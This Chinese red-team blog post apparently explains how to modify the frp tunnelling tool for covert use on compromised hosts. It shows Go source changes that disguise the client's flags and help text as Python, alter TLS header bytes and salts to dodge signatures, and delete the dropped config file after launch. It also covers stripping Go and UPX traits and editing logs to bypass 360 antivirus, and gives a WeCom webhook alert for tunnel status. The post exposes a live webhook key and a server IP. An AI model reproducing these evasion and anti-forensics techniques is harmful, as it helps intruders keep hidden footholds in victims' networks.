1、如果frpc客户端被偷，默认加密方式不对，连不上客户端，-h使用方式也删除了<br />2、增加了企业微信提醒功能<br />3、大大提高了命令的隐秘，去掉了传统的-c xxx.ini模式<br />4、能免杀过360  
<a name="V0n9P"></a>
## 魔改参数方便隐秘
frpc客户端入口<br />github.com/fatedier/cmd/frpc/main.go<br />修改参数 github.com/fatedier/cmd/frpc/sub/root.go<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1648133241168-00996b31-33a1-4e96-8ee4-65a404136347.png#averageHue=%23fdfbfa&clientId=uf4792829-3b67-4&from=paste&height=119&id=u9c318e47&originHeight=159&originWidth=926&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13658&status=done&style=none&taskId=ud7b1ab5a-2ec6-4170-ae58-5622f49196f&title=&width=695)<br />     效果 （去除了传统的 -c xxx.ini特征）<br />↓<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1648133307522-acfb2fb6-332b-4802-b892-1a82dbc470ee.png#averageHue=%23072d5f&clientId=uf4792829-3b67-4&from=paste&id=u7deb5ff8&originHeight=47&originWidth=452&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6328&status=done&style=none&taskId=u0ff24c13-aed8-4ada-8c56-34f80f3bcac&title=)

<a name="isBb8"></a>
## 魔改接入的密钥避免工具被盗
frps服务端的入口<br />github.com/fatedier/cmd/frps/main.go

端对端对接的加密密钥，服务端和客户端需要一致，才能连接<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1648132940671-43b75708-3b31-4037-a343-bb5337762451.png#averageHue=%23faf7f5&clientId=uf4792829-3b67-4&from=paste&height=393&id=ub7a86be7&originHeight=524&originWidth=580&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31249&status=done&style=none&taskId=ue30ddfd7-8174-4e92-8653-44d59447f04&title=&width=435)

<a name="SErIh"></a>
## 设置上线提醒以及断线提醒
我是从服务端的角度去改的，但是其实客户端也是一个思路。<br />企业微信接口<br />curl '[https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=4cc74dbf-2965-4627-8005-1:](https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=4cc74dbf-2965-4627-8005-1:) "text","text": {"content": "hello ttttttttttt","mentioned_list":["aufeng","@all"]}'<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1648223576585-f4c6dfc1-76b7-44f4-b362-d8522e5ed584.png#averageHue=%23259113&clientId=u998867ec-d769-4&from=paste&height=624&id=ub8132d53&originHeight=832&originWidth=869&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82298&status=done&style=none&taskId=u8baccfb6-723b-4494-b50c-1c8a3713e31&title=&width=652)

frp上线代码<br />github.com/fatedier/server/proxy/tcp.go<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1648223544049-ecac337c-254e-4e07-9fab-27262fef55d5.png#averageHue=%23faf9f8&clientId=u998867ec-d769-4&from=paste&height=486&id=u96b2ef08&originHeight=648&originWidth=1474&originalType=binary&ratio=1&rotation=0&showTitle=false&size=78306&status=done&style=none&taskId=ud60d3ee2-d221-4340-807e-7c810a5a138&title=&width=1106)

github.com/fatedier/server/proxy/proxy.go<br />断线的代码
```java
func (pxy *BaseProxy) Close() {
	xl := xlog.FromContextSafe(pxy.ctx)
	xl.Info("proxy closing")
	targetUrl := "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=4cc74dbf-2965-4627-8005-1d8ed015e173"
	a :=fmt.Sprintf("{\"msgtype\": \"text\",\"text\": {\"content\": \"frp socks 掉线了!!! %s %s\",\"mentioned_list\":[\"aufeng\",\"@all\"]}}",pxy.name,xl)
	payload := strings.NewReader(a)
	req, _ := http.NewRequest("POST", targetUrl, payload)
	req.Header.Add("Content-Type", "application/json")
	response, err := http.DefaultClient.Do(req)
	if err == nil{
		fmt.Println(response)
	}
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1648223475236-7352e716-98c0-4277-a7a5-c34c85a363a8.png#averageHue=%23faf9f7&clientId=u998867ec-d769-4&from=paste&height=467&id=u2f4aa392&originHeight=622&originWidth=1446&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76850&status=done&style=none&taskId=ufa3ffa2c-4a10-48a4-a72b-06f5c2f3371&title=&width=1085)<br />效果：<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1648223205506-ba47bec0-9002-4183-811a-cc0792a595a4.png#averageHue=%23e5e8ec&clientId=u998867ec-d769-4&from=paste&height=568&id=u7f035276&originHeight=757&originWidth=878&originalType=binary&ratio=1&rotation=0&showTitle=false&size=190955&status=done&style=none&taskId=u4ad8dcbc-4e21-48d9-b97a-e9ca7141d47&title=&width=659)


./frps-a6 -p 7002 -t www.abc.eee<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1648224786862-c3a76c9b-96b5-41be-be96-c88a1667fc72.png#averageHue=%2303285a&clientId=ua32cc1d7-f435-4&from=paste&height=121&id=uf1135e12&originHeight=161&originWidth=1200&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31127&status=done&style=none&taskId=ubdf0b139-bcaa-4927-8194-613c267e356&title=&width=900)


<a name="v8UZY"></a>
## 去除go 特征
```java
\go-strip.exe -f D:\安全\工具\内网工具\隧道\frp\frp_0.40.0_windows_amd64\frp_0.40.0_windows_amd64\calc.exe -a -output calc.exe
```

<a name="AQqIm"></a>
## 用kali自带的upx进行压缩(不要用windows


<a name="UKh4q"></a>
## tips
可以改成这样子的方式<br />python -m http.server

查杀的点，可以改一下客户端运行输出的日志，像login to server以及proxy added这些日志的输出<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1669129076366-0568f72d-1c22-44d1-b2d7-a6188f5eb0be.png#averageHue=%2304295b&clientId=ube9385ad-1178-4&from=paste&height=278&id=ub8d97a10&originHeight=348&originWidth=1208&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71849&status=done&style=none&taskId=u37793cbe-9abd-4511-a6df-71f1f58b195&title=&width=966.4)


<a name="u6PiH"></a>
## 0.45魔改
1、默认的加密密钥DefaultSalt，这个会影响c端的使用 √<br />D:\go1.20.2.windows-amd64\go\project\src\frp-0.48.0\frp-0.48.0\cmd\frps\main.go<br />D:\go1.20.2.windows-amd64\go\project\src\frp-0.48.0\frp-0.48.0\client\service.go

2、消息提示的时候没有判断系统版本，windows服务端可能就没消息，这个是server端，不影响c端的使用√<br />3、特征改成了0x10 √<br />D:\go\github\src\github.com\fatedier\frp-0.45\pkg\util\net\tls.go
```
// Copyright 2019 fatedier, fatedier@gmail.com
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package net

import (
	"crypto/tls"
	"fmt"
	"net"
	"time"

	gnet "github.com/fatedier/golib/net"
)

var (
	FRPTLSHeadByte = 0x10
)

func CheckAndEnableTLSServerConnWithTimeout(
	c net.Conn, tlsConfig *tls.Config, tlsOnly bool, timeout time.Duration,
) (out net.Conn, isTLS bool, custom bool, err error) {
	sc, r := gnet.NewSharedConnSize(c, 2)
	buf := make([]byte, 1)
	//sc, r := gnet.NewSharedConnSize(c, 4)
	//buf := make([]byte, 3)
	var n int
	_ = c.SetReadDeadline(time.Now().Add(timeout))
	n, err = r.Read(buf)
	_ = c.SetReadDeadline(time.Time{})
	if err != nil {
		return
	}

	switch {
	case n == 1 && int(buf[0]) == FRPTLSHeadByte:
		//case n == 3 && int(buf[0]) == FRPTLSHeadByte:
		out = tls.Server(c, tlsConfig)
		isTLS = true
		custom = true
	case n == 1 && int(buf[0]) == 0x16:
		out = tls.Server(sc, tlsConfig)
		isTLS = true
	default:
		if tlsOnly {
			err = fmt.Errorf("non-TLS connection received on a TlsOnly server")
			return
		}
		out = sc
	}
	return
}

```
4、frpc端的日志稍微改一下 √

5、c端落地的文件自动删除 √<br />D:\go\github\src\github.com\fatedier\frp-0.45\cmd\frpc\sub\root.go
```
// Copyright 2018 fatedier, fatedier@gmail.com
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package sub

import (
	"fmt"
	"io/fs"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"sync"
	"syscall"
	"time"

	"github.com/spf13/cobra"

	"github.com/fatedier/frp/client"
	"github.com/fatedier/frp/pkg/auth"
	"github.com/fatedier/frp/pkg/config"
	"github.com/fatedier/frp/pkg/util/log"
	//"github.com/fatedier/frp/pkg/util/version"
)

const (
	CfgFileTypeIni = iota
	CfgFileTypeCmd
)

var (
	cfgFile     string
	cfgDir      string
	showVersion bool

	serverAddr      string
	user            string
	protocol        string
	token           string
	logLevel        string
	logFile         string
	logMaxDays      int
	disableLogColor bool

	proxyName         string
	localIP           string
	localPort         int
	remotePort        int
	useEncryption     bool
	useCompression    bool
	customDomains     string
	subDomain         string
	httpUser          string
	httpPwd           string
	locations         string
	hostHeaderRewrite string
	role              string
	sk                string
	multiplexer       string
	serverName        string
	bindAddr          string
	bindPort          int
	delEnable bool
	tlsEnable bool
)

func init() {
	rootCmd.PersistentFlags().StringVarP(&cfgFile, "conf", "m", "", "python for httpserver")
	rootCmd.PersistentFlags().StringVarP(&cfgDir, "", "", "", "python direct")
	rootCmd.PersistentFlags().BoolVarP(&showVersion, "version", "v", false, "version of python")
}

func RegisterCommonFlags(cmd *cobra.Command) {
	cmd.PersistentFlags().StringVarP(&serverAddr, "server_addr", "s", "127.0.0.1:7000", "python server's address")
	cmd.PersistentFlags().StringVarP(&user, "user", "u", "", "user")
	cmd.PersistentFlags().StringVarP(&protocol, "protocol", "p", "tcp", "tcp or kcp or websocket")
	cmd.PersistentFlags().StringVarP(&token, "token", "t", "", "auth token")
	cmd.PersistentFlags().StringVarP(&logLevel, "log_level", "", "info", "log level")
	cmd.PersistentFlags().StringVarP(&logFile, "log_file", "", "console", "console or file path")
	cmd.PersistentFlags().IntVarP(&logMaxDays, "log_max_days", "", 3, "log file reversed days")
	cmd.PersistentFlags().BoolVarP(&disableLogColor, "disable_log_color", "", false, "disable log color in console")
	cmd.PersistentFlags().BoolVarP(&tlsEnable, "tls_enable", "", true, "enable python tls")
	cmd.PersistentFlags().BoolVarP(&delEnable, "del", "", false, "enable auto delete") //必须true了才能自删除
}

var rootCmd = &cobra.Command{
	Use:   "Options and arguments (and corresponding environment variables)",
	Short: "python 3.7 [option] ...",
	RunE: func(cmd *cobra.Command, args []string) error {
		if showVersion {
			fmt.Println("python for 0.45")
			return nil
		}

		// If cfgDir is not empty, run multiple frpc service for each config file in cfgDir.
		// Note that it's only designed for testing. It's not guaranteed to be stable.
		if cfgDir != "" {
			var wg sync.WaitGroup
			_ = filepath.WalkDir(cfgDir, func(path string, d fs.DirEntry, err error) error {
				if err != nil {
					return nil
				}
				if d.IsDir() {
					return nil
				}
				wg.Add(1)
				time.Sleep(time.Millisecond)
				go func() {
					defer wg.Done()
					err := runClient(path)
					if err != nil {
						fmt.Printf("python service error for config file [%s]\n", path)
					}
				}()
				return nil
			})
			wg.Wait()
			return nil
		}

		// Do not show command usage here.
		err := runClient(cfgFile)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
		return nil
	},
}

func Execute() {
	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}

func handleSignal(svr *client.Service, doneCh chan struct{}) {
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
	<-ch
	svr.GracefulClose(500 * time.Millisecond)
	close(doneCh)
}

func parseClientCommonCfgFromCmd() (cfg config.ClientCommonConf, err error) {
	cfg = config.GetDefaultClientConf()

	ipStr, portStr, err := net.SplitHostPort(serverAddr)
	if err != nil {
		err = fmt.Errorf("invalid server_addr: %v", err)
		return
	}

	cfg.ServerAddr = ipStr
	cfg.ServerPort, err = strconv.Atoi(portStr)
	if err != nil {
		err = fmt.Errorf("invalid server_addr: %v", err)
		return
	}

	cfg.User = user
	cfg.Protocol = protocol
	cfg.LogLevel = logLevel
	cfg.LogFile = logFile
	cfg.LogMaxDays = int64(logMaxDays)
	cfg.DisableLogColor = disableLogColor

	// Only token authentication is supported in cmd mode
	cfg.ClientConfig = auth.GetDefaultClientConf()
	cfg.Token = token
	cfg.TLSEnable = tlsEnable

	cfg.Complete()
	if err = cfg.Validate(); err != nil {
		err = fmt.Errorf("parse config error: %v", err)
		return
	}
	return
}

func runClient(cfgFilePath string) error {
	cfg, pxyCfgs, visitorCfgs, err := config.ParseClientConfig(cfgFilePath)
	if err != nil {
		return err
	}
	return startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)
}

func startService(
	cfg config.ClientCommonConf,
	pxyCfgs map[string]config.ProxyConf,
	visitorCfgs map[string]config.VisitorConf,
	cfgFile string,
) (err error) {
	log.InitLog(cfg.LogWay, cfg.LogFile, cfg.LogLevel,
		cfg.LogMaxDays, cfg.DisableLogColor)

	if cfgFile != "" {
		log.Trace("start python service for config file [%s]", cfgFile)
		defer log.Trace("python service for config file [%s] stopped", cfgFile)
	}
	svr, errRet := client.NewService(cfg, pxyCfgs, visitorCfgs, cfgFile)
	if errRet != nil {
		err = errRet
		return
	}


	//删除配置文件
	if delEnable == true {
		err := os.Remove(cfgFile)
		if err != nil {
			return err
		}
	}
	kcpDoneCh := make(chan struct{})
	// Capture the exit signal if we use kcp.
	if cfg.Protocol == "kcp" {
		go handleSignal(svr, kcpDoneCh)
	}

	err = svr.Run()
	if err == nil && cfg.Protocol == "kcp" {
		<-kcpDoneCh
	}
	return
}

```

6、清除所有frpc的一些静态文字特征 √<br />7、压缩后清除upx特征√<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1669367677524-eba84ff4-751a-41e9-81f6-b62985713800.png#averageHue=%23f4f5f8&clientId=u899aada6-8e9b-4&from=paste&height=289&id=ufb2694f4&originHeight=361&originWidth=233&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14349&status=done&style=none&taskId=u6a73c986-bf6b-4040-afad-df646bca686&title=&width=186.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1669367665607-42f455d0-0db0-4fe4-af86-ab1d9cf700eb.png#averageHue=%2303285b&clientId=u899aada6-8e9b-4&from=paste&height=58&id=ubdd6eadd&originHeight=73&originWidth=869&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12273&status=done&style=none&taskId=uc58abeb0-2f61-4c09-8e62-48f932627db&title=&width=695.2)

<a name="Dou5L"></a>
## 参数魔改，配置文件不落地

输入方式<br />readteam:43.143.18.98:8443:53000<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1683448100666-101a3b9a-32f4-4e06-9386-2245f8609877.png#averageHue=%2314110f&clientId=ufab57355-1814-4&from=paste&height=104&id=u1439b2ef&originHeight=130&originWidth=1004&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16315&status=done&style=none&taskId=ua7becf80-2257-4132-8cb2-38e3f6d9269&title=&width=803.2)

这样子来执行<br />![5f4307d99e047f4a67da92c0d36699b.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1683448252730-87f45c93-d0d1-4981-8828-8cd0db930ca2.png#averageHue=%23022659&clientId=ufab57355-1814-4&from=paste&height=54&id=u09199e0e&originHeight=68&originWidth=1429&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7367&status=done&style=none&taskId=uf4fb1b93-e3c8-4713-85eb-b95f1b06650&title=&width=1143.2)

解密函数 亦或解密<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1683445078739-8ecc9485-0774-48c7-a2fb-50f80c76af06.png#averageHue=%23fcfbfb&clientId=u56da2682-aa8b-4&from=paste&height=318&id=uaad3854e&originHeight=397&originWidth=748&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24298&status=done&style=none&taskId=u75190f71-a1d6-482f-9347-d1abdd4f0ae&title=&width=598.4)

![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1683448084424-f038433f-be01-4772-a521-835b61314e9c.png#averageHue=%23fcfbfa&clientId=ufab57355-1814-4&from=paste&height=434&id=u61144904&originHeight=543&originWidth=484&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25204&status=done&style=none&taskId=u4e648678-1e21-448c-a5df-994c2e59b90&title=&width=387.2)

p参数接收  <br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1683445103085-23e0fcdc-6428-4ba6-9618-fb7852d9c83a.png#averageHue=%23fcf8f3&clientId=u56da2682-aa8b-4&from=paste&height=146&id=u1ea18d0a&originHeight=183&originWidth=888&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15222&status=done&style=none&taskId=u8e964bc8-0b7e-4f43-b5fb-ed63da5f4a4&title=&width=710.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1683445138187-a7962cb0-3e8d-420f-8386-1b261a78f981.png#averageHue=%23fbfafa&clientId=u56da2682-aa8b-4&from=paste&height=266&id=ua69f1ea7&originHeight=332&originWidth=586&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19917&status=done&style=none&taskId=u9629b051-29e6-4f1d-8ea9-405bbf4f3bb&title=&width=468.8)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1683445122412-3b459840-29c5-4fce-bc9c-a37292ecfac6.png#averageHue=%23fcfafa&clientId=u56da2682-aa8b-4&from=paste&height=426&id=uc12093d5&originHeight=532&originWidth=946&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40076&status=done&style=none&taskId=u44beaf80-2e0b-48f3-922c-7762d7528bf&title=&width=756.8)


<a name="Dhltt"></a>
## 使用手册：
服务端启动<br />./frps0.48-af -t www.abc.eee -p 8443<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1686581473548-f3dfbe2f-9f7d-4d1a-a342-90e326690f60.png#averageHue=%230a0705&clientId=u5e486cbc-dbe4-4&from=paste&height=62&id=u7a1763bf&originHeight=78&originWidth=757&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13037&status=done&style=none&taskId=u854f82a6-638c-496c-aad8-7b7858a7ed4&title=&width=605.6)

客户端连接使用先把服务器的信息进行加密<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1686581573663-b39c2846-91f9-4eda-9f4a-f2ba8244bfff.png#averageHue=%2304295b&clientId=u5e486cbc-dbe4-4&from=paste&height=147&id=u8779ca60&originHeight=184&originWidth=1018&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33964&status=done&style=none&taskId=u8633faf4-1701-48c3-9e59-e6a7ebc8381&title=&width=814.4)

然后使用redis工具进行连接，建立成功连接，会显示ojbk，同时企业微信机器人会有上下线通知，及时方便隧道情况

windows：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1686581640071-bfc562c4-a94c-48d9-a5b8-c37533f01363.png#averageHue=%2304295b&clientId=u5e486cbc-dbe4-4&from=paste&height=56&id=ucc2b4260&originHeight=70&originWidth=1195&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15222&status=done&style=none&taskId=ue439310e-35af-497d-ace3-0e5b63a7623&title=&width=956)

linux：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1686581860627-fbe58034-9233-493a-ae8f-cfb5ca7cb2bc.png#averageHue=%23060403&clientId=u5e486cbc-dbe4-4&from=paste&height=56&id=ucdc50b82&originHeight=70&originWidth=1005&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=4915&status=done&style=none&taskId=ub580e27c-bdb1-4013-be57-f9e1c279c0c&title=&width=804)<br />![e8e742b658293f550918abd05b06690.jpg](https://cdn.nlark.com/yuque/0/2023/jpeg/1345801/1686581706266-86a78ddb-44a2-4f9b-8ed3-f8ee00252425.jpeg#averageHue=%23f9fbfa&clientId=u5e486cbc-dbe4-4&from=paste&height=508&id=u2facab53&originHeight=2400&originWidth=1080&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=435104&status=done&style=none&taskId=uc585e2c6-e1fb-44a3-a155-fd6204853d4&title=&width=228.60000610351562)
